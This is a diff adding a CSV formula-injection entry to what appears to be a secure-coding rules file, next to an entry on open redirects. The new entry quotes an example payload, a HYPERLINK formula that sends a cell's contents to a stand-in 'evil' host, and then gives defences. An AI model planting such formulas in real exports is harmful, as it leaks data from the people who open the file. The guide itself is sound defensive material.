@@ -105,3 +105,10 @@ keywords: ?next= redirects anywhere
 refs: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
 
 Redirecting to a URL from a parameter (`?next=`, `?returnUrl=`) lets attackers bounce users to phishing sites with your domain in the link. Accept only relative paths (rejecting `//evil.com` and backslash variants) or IDs mapped to allowlisted destinations.
+
+## csv-formula-injection: Neutralize spreadsheet formulas in exported CSV cells
+tags: security, csv, excel, spreadsheet, formula injection, export, google sheets
+keywords: export to csv, open in excel, download report
+refs: https://owasp.org/www-community/attacks/CSV_Injection
+
+Spreadsheet programs evaluate a cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return as a formula, so a user-controlled value such as `=HYPERLINK("http://evil/?"&A1,"Click")` runs when finance opens the export. Prefix such text cells with a single quote (`'`), and write rows with a CSV library (`csv.writer`, not string joins) so commas, quotes and newlines are quoted. Apply it to every field a user can influence, not only names.
